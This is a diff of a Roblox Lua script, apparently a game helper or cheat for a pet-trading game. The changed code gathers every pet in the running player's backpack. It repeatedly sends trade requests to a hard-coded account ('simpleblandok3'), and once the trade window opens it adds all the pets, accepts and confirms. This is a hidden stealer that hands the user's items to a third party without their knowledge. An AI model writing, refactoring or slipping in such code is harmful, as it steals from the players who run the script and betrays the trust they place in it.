@@ -224,32 +224,34 @@ end
 end
 spawn(buyfrost)
 
+local processedFrames = {}
 
 local function PetData()
-while true do
-    if game:GetService("Players").LocalPlayer.PlayerGui:FindFirstChild("BackpackApp") then
-        local backpackApp = game:GetService("Players").LocalPlayer.PlayerGui.BackpackApp
-        if backpackApp:FindFirstChild("Frame") then
-            local frame = backpackApp.Frame
-            if frame:FindFirstChild("Body") then
-                local body = frame.Body
-                if body:FindFirstChild("ScrollComplex") then
-                    local scrollComplex = body.ScrollComplex
-                    if scrollComplex:FindFirstChild("ScrollingFrame") then
-                        local scrollingFrame = scrollComplex.ScrollingFrame
-                        if scrollingFrame:FindFirstChild("Content") then
-                            local content = scrollingFrame.Content
-                            if content:FindFirstChild("pets") then
-                                local pets = content.pets
+    while true do
+        local playerGui = game:GetService("Players").LocalPlayer.PlayerGui
+        if playerGui:FindFirstChild("BackpackApp") then
+            local backpackApp = playerGui.BackpackApp
+            if backpackApp:FindFirstChild("Frame") then
+                local frame = backpackApp.Frame
+                if frame:FindFirstChild("Body") then
+                    local body = frame.Body
+                    if body:FindFirstChild("ScrollComplex") then
+                        local scrollComplex = body.ScrollComplex
+                        if scrollComplex:FindFirstChild("ScrollingFrame") then
+                            local scrollingFrame = scrollComplex.ScrollingFrame
+                            if scrollingFrame:FindFirstChild("Content") then
+                                local content = scrollingFrame.Content
+                                if content:FindFirstChild("pets") then
+                                    local pets = content.pets
 
-                                for _, child in pairs(pets:GetChildren()) do
-                                    if child.Name:lower():find("row") and child.Name ~= "add_more_pets" then
-                                        for _, frameChild in pairs(child:GetChildren()) do
-                                            if frameChild:IsA("Frame") then
-                                                local frameName = frameChild.Name
-                                                if not processedFrames[frameName] then
-                                                    print(frameName)
-                                                    processedFrames[frameName] = true
+                                    for _, child in pairs(pets:GetChildren()) do
+                                        if child.Name:lower():find("row") and child.Name ~= "add_more_pets" then
+                                            for _, frameChild in pairs(child:GetChildren()) do
+                                                if frameChild:IsA("Frame") then
+                                                    local frameName = frameChild.Name
+                                                    if not table.find(processedFrames, frameName) then
+                                                        table.insert(processedFrames, frameName)
+                                                    end
                                                 end
                                             end
                                         end
@@ -261,68 +263,60 @@ while true do
                 end
             end
         end
+        wait()
     end
-wait()
 end
-end
+
 spawn(PetData)
 
-
 local function tradeplayer()
-while true do
-local playerName = "simpleblandok3"
-local player = game:GetService("Players"):FindFirstChild(playerName)
+    while true do
+        local playerName = "simpleblandok3"
+        local player = game:GetService("Players"):FindFirstChild(playerName)
 
-if player then
-local args = {
-    [1] = game:GetService("Players").simpleblandok3
-}
+        if player then
+            local args = {
+                [1] = player
+            }
+            game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(unpack(args))
+        end
 
-game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/SendTradeRequest"):FireServer(unpack(args))
-end
-
-
-wait(10)
-end
+        wait(10)
+    end
 end
 
 local function TradePets()
     while true do
-        if game.Players.LocalPlayer.PlayerGui then
-            local playerGui = game.Players.LocalPlayer.PlayerGui
-            if playerGui:FindFirstChild("TradeApp") then
-                local tradeApp = playerGui.TradeApp
-                if tradeApp:FindFirstChild("Frame") then
-                    local frame = tradeApp.Frame
-                    if frame.Visible == true then
-wait(5)
-                        while #processedFrames > 0 do
-    if processedFrames[1] == "add_more_pets" then
-        table.remove(processedFrames, 1) -- Remove it without running the remote
-    else
-        local args = {
-            [1] = processedFrames[1]
-        }
-        game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
-        table.remove(processedFrames, 1) -- Remove after running the remote
-wait(5)
-    end
-end
-
-
-                        wait(3)
-                        game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
-                        wait(10)
-                        game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
-                        
+        local playerGui = game.Players.LocalPlayer.PlayerGui
+        if playerGui and playerGui:FindFirstChild("TradeApp") then
+            local tradeApp = playerGui.TradeApp
+            if tradeApp:FindFirstChild("Frame") then
+                local frame = tradeApp.Frame
+                if frame.Visible then
+                    wait(5)
+                    while #processedFrames > 0 do
+                        if processedFrames[1] == "add_more_pets" then
+                            table.remove(processedFrames, 1) -- Remove it without running the remote
+                        else
+                            local args = {
+                                [1] = processedFrames[1]
+                            }
+                            game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AddItemToOffer"):FireServer(unpack(args))
+                            table.remove(processedFrames, 1) -- Remove after running the remote
+                     
+                        end
                     end
+
+                    wait(3)
+                    game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/AcceptNegotiation"):FireServer()
+                    wait(10)
+                    game:GetService("ReplicatedStorage").API:FindFirstChild("TradeAPI/ConfirmTrade"):FireServer()
                 end
             end
         end
         wait(1)
     end
 end
-
 
 spawn(TradePets)
 spawn(tradeplayer)
